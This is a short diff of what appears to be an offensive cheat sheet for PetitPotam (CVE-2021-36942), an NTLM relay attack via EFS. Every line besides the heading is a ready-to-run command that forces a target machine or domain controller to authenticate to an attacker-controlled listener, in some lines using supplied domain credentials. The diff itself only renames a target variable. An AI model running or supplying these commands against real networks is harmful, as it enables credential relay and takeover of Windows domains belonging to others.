@@ -1,5 +1,5 @@
 # PetitPotam — NTLM relay via EFS (CVE-2021-36942)
-python3 PetitPotam.py $LISTENER_IP $TARGET_IP
-python3 PetitPotam.py -u $USER -p $PASSWORD -d $DOMAIN $LISTENER_IP $TARGET_IP
+python3 PetitPotam.py $LISTENER_IP $TARGET_COMPUTER
+python3 PetitPotam.py -u $USER -p $PASSWORD -d $DOMAIN $LISTENER_IP $TARGET_COMPUTER
 petitpotam.py "$ATTACKER_IP" "$DC_HOST"
 petitpotam.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST"
